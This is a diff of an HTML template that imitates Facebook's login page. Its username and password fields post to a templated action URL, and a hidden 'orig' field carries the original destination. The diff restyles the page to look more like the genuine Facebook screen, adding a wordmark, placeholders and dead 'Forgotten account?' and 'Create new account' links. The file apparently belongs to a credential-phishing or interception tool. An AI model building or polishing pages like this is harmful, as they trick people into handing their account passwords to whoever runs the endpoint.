@@ -5,30 +5,41 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Facebook</title>
 <style>
-  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-  .card { background: #fff; width: 396px; padding: 32px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,.14); text-align: center; }
-  h1 { color: #1877f2; font-size: 34px; font-weight: 700; margin: 8px 0 4px; }
-  .sub { color: #606770; font-size: 14px; margin-bottom: 20px; }
-  form { text-align: left; }
-  input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 10px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 16px; }
-  button { width: 100%; padding: 12px; border: 0; border-radius: 6px; background: #1877f2; color: #fff; font-size: 17px; font-weight: 600; cursor: pointer; }
-  button:hover { background: #166fe5; }
-  .note { margin-top: 16px; font-size: 12px; color: #90949c; }
+  * { box-sizing: border-box; }
+  body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 24px; }
+  .wrap { width: 396px; }
+  .wordmark { color: #1877f2; font-size: 44px; font-weight: 700; text-align: center; margin-bottom: 20px; }
+  .card { background: #fff; padding: 20px 16px 28px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); text-align: center; }
+  h1 { font-size: 18px; font-weight: 400; color: #1c1e21; margin: 8px 0 20px; }
+  input { width: 100%; padding: 12px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; color: #1c1e21; }
+  input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 1px #1877f2 inset; }
+  button[type=submit] { width: 100%; padding: 12px 16px; border: 0; border-radius: 6px; background: #1877f2; color: #fff; font-size: 20px; font-weight: 700; cursor: pointer; margin: 4px 0 16px; }
+  button[type=submit]:hover { background: #166fe5; }
+  a { color: #1877f2; font-size: 14px; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .forgot { display: block; text-align: center; }
+  .divider { display: flex; align-items: center; margin: 20px 0; color: #606770; font-size: 12px; }
+  .divider::before, .divider::after { content: ""; flex: 1; border-top: 1px solid #dadde1; }
+  .divider span { margin: 0 16px; }
+  .signup { display: block; width: 100%; padding: 12px 16px; border: 0; border-radius: 6px; background: #42b72a; color: #fff; font-size: 17px; font-weight: 700; text-align: center; text-decoration: none; }
+  .signup:hover { background: #36a420; text-decoration: none; }
 </style>
 </head>
 <body>
-<div class="card">
-  <h1>facebook</h1>
-  <p class="sub">Log in to Facebook</p>
-  <form method="post" action="{{.Action}}">
-    <input type="hidden" name="orig" value="{{.Orig}}">
-    <label>Email or phone</label>
-    <input type="text" name="username" required autofocus>
-    <label>Password</label>
-    <input type="password" name="password" required>
-    <button type="submit">Log In</button>
-  </form>
-  <p class="note">You must be signed in to continue.</p>
+<div class="wrap">
+  <div class="wordmark">facebook</div>
+  <div class="card">
+    <h1>Log in to Facebook</h1>
+    <form method="post" action="{{.Action}}">
+      <input type="hidden" name="orig" value="{{.Orig}}">
+      <input type="text" name="username" placeholder="Email or phone number" required autofocus>
+      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+      <button type="submit">Log In</button>
+      <a class="forgot" href="#">Forgotten account?</a>
+    </form>
+    <div class="divider"><span>or</span></div>
+    <a class="signup" href="#">Create new account</a>
+  </div>
 </div>
 </body>
 </html>
